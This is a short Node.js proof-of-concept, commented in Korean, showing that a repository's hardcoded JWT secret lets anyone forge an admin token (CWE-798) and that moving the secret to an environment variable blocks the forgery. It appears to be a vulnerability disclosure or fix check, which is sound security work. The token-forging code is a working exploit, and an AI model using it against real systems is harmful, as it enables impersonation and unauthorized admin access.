// PoC: 하드코딩 JWT 시크릿 → 자격증명 없이 토큰 위조 (CWE-798)
// 실제 jsonwebtoken 라이브러리로 검증. 추정 아님.
const jwt = require('./repo/Back-end/node_modules/jsonwebtoken');

// git 공개 repo에 박힌 시크릿 (login.controller.ts:9, verify.token.ts:5)
const LEAKED_SECRET = 'my-secret-key';

console.log('=== 취약 (수정 전): 하드코딩 시크릿 ===');
// 공격자: 시크릿을 git에서 읽음 → 임의 유저로 토큰 위조
const forged = jwt.sign({ userId: 'admin' }, LEAKED_SECRET, { expiresIn: '30m' });
console.log('위조 토큰:', forged.slice(0, 40) + '...');

// 서버 authMiddleware 재현: 같은 시크릿으로 verify
try {
  const decoded = jwt.verify(forged, LEAKED_SECRET);
  console.log('서버 검증 통과:', JSON.stringify(decoded));
  console.log('>> VULNERABLE: 자격증명 0으로 admin 위장 성공\n');
} catch (e) {
  console.log('거부됨:', e.message, '\n');
}

console.log('=== 수정 후: 시크릿이 env(비공개) ===');
// 수정 후 서버는 process.env.JWT_SECRET (공격자 모름) 사용
const REAL_SECRET = process.env.JWT_SECRET || require('crypto').randomBytes(32).toString('hex');
console.log('서버 실제 시크릿: (env, 공격자 모름)');
// 공격자는 여전히 유출된 옛 시크릿으로 위조 시도
const stillForged = jwt.sign({ userId: 'admin' }, LEAKED_SECRET, { expiresIn: '30m' });
try {
  jwt.verify(stillForged, REAL_SECRET);
  console.log('>> STILL VULNERABLE');
} catch (e) {
  console.log('위조 토큰 거부:', e.message);
  console.log('>> FIXED: 유출된 시크릿으로 위조 불가');
}
